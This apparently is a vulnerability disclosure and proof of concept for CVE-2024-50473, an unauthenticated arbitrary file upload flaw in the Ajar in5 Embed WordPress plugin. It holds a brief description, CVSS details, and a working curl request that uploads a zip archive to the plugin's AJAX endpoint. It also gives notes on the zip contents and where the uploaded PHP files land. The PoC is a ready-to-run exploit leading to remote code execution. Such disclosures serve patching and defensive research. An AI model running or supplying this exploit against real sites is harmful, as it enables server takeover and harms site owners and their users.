# CVE-2024-50473
Ajar in5 Embed &lt;= 3.1.3 - Unauthenticated Arbitrary File Upload

# Description:
The Ajar in5 Embed plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in all versions up to, and including, 3.1.3. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible.


```
Published: 2024-10-25 00:00:00
CVE: CVE-2024-50473
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
CVSS Score: 9.8
Slugs: ajar-productions-in5-embed
```

Note: Zip file must contain a index.html even if blank and you will get a 500 error which is normal.

The uploaded files for this will be found in /wp-content/uploads/2024/php5/ - php5 is the name of the zip file with out the extention.

POC
---

```
curl -X POST "http://kubernetes.docker.internal/wp-admin/admin-ajax.php?action=in5&in5=upload" \
-H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0" \
-H "Accept: application/json, text/javascript, */*; q=0.01" \
-H "Accept-Language: en-US,en;q=0.5" \
-H "Accept-Encoding: gzip, deflate, br" \
-H "Referer: http://kubernetes.docker.internal/wp-admin/post.php?post=4142&action=edit" \
-H "X-Requested-With: XMLHttpRequest" \
-H "Content-Type: multipart/form-data" \
-F "customPath=wp-content/uploads/2024/" \
-F "files[]=@/path/to/php5.zip" \
--compressed
```
